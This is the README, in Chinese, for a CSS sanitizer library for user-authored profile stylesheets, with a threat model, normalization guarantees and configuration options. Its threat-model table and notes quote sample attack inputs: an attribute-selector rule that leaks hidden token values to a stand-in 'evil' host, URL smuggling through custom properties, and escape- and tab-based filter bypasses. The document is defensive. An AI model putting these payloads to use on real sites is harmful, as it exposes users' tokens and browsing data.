# css-sanitizer

面向"用户自定义主页样式表"场景的 CSS 净化器。不做正则替换,而是按
**CSS Syntax Module Level 3** 规范实现分词器 → 解析器 → 语义净化 →
规范化序列化,保证净化器看到的令牌流与浏览器完全一致。

## 威胁模型

| 攻击 | 原理 | 对策 |
|---|---|---|
| 属性选择器令牌外带 | `input[value^="a"] { background: url(//evil/?a) }` 逐字符探测隐藏表单令牌 | 敏感属性(默认 `value`)上的任何值匹配选择器被移除;组合保护(见下) |
| 前缀匹配 + 绝对 URL 组合 | 对任意属性用 `^= $= *= \|=` 探测并回传 | 组合保护:含前缀类匹配器的规则禁止加载绝对 URL,且禁止在 URL 加载属性中用 `var()` |
| unicode-range 字体探测 | 每个字符一个 `@font-face`,按字形条件加载 URL,探测页面出现的文字 | `@font-face` 中的 `unicode-range` 描述符一律剥离 |
| `@import` 引入攻击者样式表 | 导入的 CSS 完全不受控 | 默认丢弃;可配置主机白名单放行 |
| `javascript:` / `data:text/html` 等 URL | 脚本执行或钓鱼 | URL 方案白名单(默认仅 `https`);`data:` 仅放行图片/字体 MIME |
| 自定义属性走私 | `--x: url(evil)` + `background: var(--x)` | 自定义属性的值走同样的 URL 策略 |
| `image-set("...")` 字符串 URL | 字符串形式的 URL 不经 `url()` 令牌 | `image-set`/`src` 内的字符串参数同样按 URL 审查 |
| `behavior` / `-moz-binding` / `expression()` | 历史脚本执行通道 | 属性黑名单 + 函数黑名单 |
| `:visited` 历史探测 | 探测访客访问过的链接 | 默认移除含 `:visited` 的选择器 |

### 规范化保证(为什么转义/注释拆分无效)

- 分词器在**令牌层面**解码转义:`\75 rl(evil)` 与 `url(evil)` 产出同一个
  url 令牌;`un\69 code-range` 与 `unicode-range` 是同一个标识符。
- 注释在分词时被吞掉且不产生任何令牌,与浏览器行为一致:`u/**/rl(x)`
  双方都看作 `ident + function`,不是 url。
- 关键字比较一律在解码后做大小写不敏感匹配(`@IMPORT`、`URL(...)`、
  `EXPRESSION(...)` 均覆盖)。
- URL 判断前先按 URL 解析器规则剥离制表符/换行/首尾控制字符,
  `java\tscript:` 无法逃逸。
- 序列化输出为规范形式;当两个相邻令牌直接拼接会合并成另一个令牌时
  (如 `url` + `(`),自动插入 `/**/` 分隔,序列化绝不会"造出"净化器
  没见过的结构。

## 用法

```ts
import { sanitizeCss } from './src/index.ts';

const { css, warnings } = sanitizeCss(userCss, {
  urlPolicy: {
    allowedSchemes: ['https'],          // 默认值
    allowedHosts: ['cdn.example.com'],  // 强烈建议:只允许自己的 CDN
    allowRelative: true,                // 默认值
    dataMimePattern: /^image\/(png|webp)$/, // 可收紧 data: 类型
  },
  sensitiveAttributes: ['value'],       // 含秘密的属性,可扩展
  comboProtection: true,                // 默认值
  allowImport: false,                   // 或 { allowedHosts: [...] }
});
```

`warnings` 记录每一次丢弃的原因,可用于审核日志或向创作者提示。

## 保留的内容

动画(`@keyframes`、`animation`、`transition`)、渐变(`linear-gradient` 等)、
网格布局、`@media`/`@supports`/`@container`/`@layer`/`@scope`、`@font-face`
(除 `unicode-range`)、自定义属性、`calc()`/`clamp()`、CSS 嵌套等创作者
常用特性原样保留(序列化为规范格式,数字等保持原始写法)。

## 已知限制(需在平台层配合)

- **默认 URL 策略允许任意 https 主机**。选择器层防御能挡住报告中两类
  外带,但访客追踪(字体/背景加载时回联)只能靠
  `urlPolicy.allowedHosts` 根治——生产环境务必配置。
- `var()` 的污点分析是启发式的:组合保护规则内的 URL 加载属性禁用
  `var()`,但不做跨规则级联求值。配合主机白名单即无风险。
- `position: fixed`/`z-index` 等 UI 伪装(UI redressing)向量不在本库
  范围内,如需限制可用 `blockedProperties` 追加。
- `@namespace` 原样保留(其 URL 只是标识符,不发生网络请求)。

## 开发

```sh
npm install
npm run typecheck   # tsc --noEmit
npm test            # node --test(57 个用例:分词/解析/净化)
```

代码结构:

- `src/tokenizer.ts` — CSS Syntax 3 分词器(预处理、转义、注释、坏字符串/坏 URL 容错)
- `src/parser.ts` — 规则/声明/组件值解析,含 CSS Nesting 混合块与错误恢复
- `src/sanitize.ts` — 语义净化策略(选择器、URL、字体描述符、自定义属性)
- `src/serialize.ts` — 规范化序列化(含防令牌合并保护)
